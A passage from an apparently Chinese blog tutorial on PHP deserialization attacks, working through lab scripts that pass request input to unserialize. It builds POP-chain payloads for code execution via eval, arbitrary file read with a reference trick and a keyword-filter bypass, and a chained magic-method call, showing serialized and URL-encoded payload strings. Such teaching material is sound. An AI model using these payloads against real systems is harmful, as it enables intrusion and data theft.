class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a = new main();</span></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>入手点在eval，但是eval不在魔术方法里。利用的方法是，调用evil类中的action方法，并且改写data属性，形成任意代码执行。</p><p>这里就需要去构造POP链，让__construct()去调用evil类，并且给data属性赋值。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> main();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//这里一定要去看源代码，不然\x00是看不到的</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;main&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;*ClassObj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;evildata&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是由于$ClassObj是protected类型修饰，$data是private类型修饰，在序列化的时候，多出来的字节都被\x00填充，需要进行在代码中使用urlencode对序列化后字符串进行编码，否则无法复制解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>main%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>ClassObj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>evil%<span class="number">00</span>data%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>phpinfo%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127143704.png"></p><h5 id="实例2-改写不可控的属性"><a href="#实例2-改写不可控的属性" class="headerlink" title="实例2 - 改写不可控的属性"></a>实例2 - 改写不可控的属性</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$user</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&quot;flag&quot;</span>)!==<span class="literal">False</span>) </span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;/etc/passwd&quot;</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;user = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$input</span>, <span class="string">&#x27;user&#x27;</span>)!==<span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        unserialize(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>入手点在file_get_contents，__destruct()输出了对象，所以就会执行__tostring()。利用方法就是控制name属性，形成任意文件读。</p><p>但是这里要解决两个问题：</p><ol><li> $input传进来的等待反序列化的字符串不能含有user，这样我们就不能改写user属性了。-&gt; 使用大S支持16进制字符串</li><li>name属性不可控，只有user属性可控，不能利用file_get_contents。-&gt; 使用浅拷贝</li></ol><p>问题解决，构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;/etc/hosts&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> MyFile();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;user;</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;u\\73er&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;MyFile&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;S:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;u\73er&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>这里就是浅copy，$a-&gt;name = &amp;$a-&gt;user; </p><p>上面这个payload不用关心name和user具体的值，只需要建立浅copy，然后绕过对user的检测就行。file_get_contents的参数name，可以通过构造的浅copy，user参数进行赋值。</p><p>例如 user=D:\\.pem</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/unserialize/3-2.php?input=O:6:%22MyFile%22:2:&#123;S:4:%22name%22;S:0:%22%22;S:4:%22u\73er%22;R:2;&#125;&amp;user=D:\\.pem</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127152740.png"></p><h5 id="实例3-构造魔术函数层层递进链1"><a href="#实例3-构造魔术函数层层递进链1" class="headerlink" title="实例3 - 构造魔术函数层层递进链1"></a>实例3 - 构造魔术函数层层递进链1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路是让程序去执行get_flag方法，现在开始分析POP链怎么走</p><ol><li><p>string1类里的__toString方法调用了get_flag方法。那我们首先要把$this-&gt;str1 赋值为GetFlag类的对象。然后去寻找怎么样才能执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag()</span><br></pre></td></tr></table></figure></li><li><p>func类里的__invoke方法进行了字符串拼接。只要把$this-&gt;mod1赋值为string1类的对象，把对象作为了字符串，就能触发之前string1类的__toString方法。现在去寻找怎么样才能执行这个__invoke</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1() 　</span><br></pre></td></tr></table></figure></li><li><p>funct类里调用了$s1,那我们把$this-&gt;mod1赋值为func类的对象，把对象当做函数去调用，就能触发之前func类的__invoke方法。现在去寻找怎么样才能执行这个__call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func() </span><br></pre></td></tr></table></figure></li><li><p>Call类里的test1方法调用了test2方法，那么我们把$this-&gt;mod1赋值为funct类的对象，再去调用test2，由于funct类里根本没有test2对象，所以就会去执行之前funct类的__call方法。现在去寻找怎么样执行这个test1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct() </span><br></pre></td></tr></table></figure></li><li><p>start_gg类里的__destruct方法调用了test1，现在我们只需要把$this-&gt;mod1赋值为Call类的对象就行了，魔术方法层层调用，POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call()</span><br></pre></td></tr></table></figure></li></ol><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//这个POP链从下往上看</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call(); <span class="comment">//5.把mod1赋值为Call对象，__destruct会自动去执行mod1对象里的test1方法，结束，POP串起来，flag读出来</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct(); <span class="comment">//4.把mod1赋值为funct对象，test1会去执行mod1对象里的test2方法，压根没这个方法，所以触发下面的__call,现在想办法执行test1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func(); <span class="comment">//3.把mod1赋值为func的对象，__call会把这个对象当函数执行，显然不行，就会触发下面的__invoke,现在想办法执行__call</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1(); <span class="comment">//2.把mod1赋值为string1的对象，现在想办法去执行__invoke，invoke执行了，下面的toString也会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();  <span class="comment">//1.把str1赋值为GetFlag的对象，现在想办法去执行__toString，执行了就能拿到flag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> start_gg;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>start_gg%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Call%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>funct%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>func%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>string1%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>str1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>GetFlag%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>str2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>mod2%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Dflag:xxxxxxxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127163359.png"></p><h5 id="实例4-构造魔术函数层层递进链2"><a href="#实例4-构造魔术函数层层递进链2" class="headerlink" title="实例4 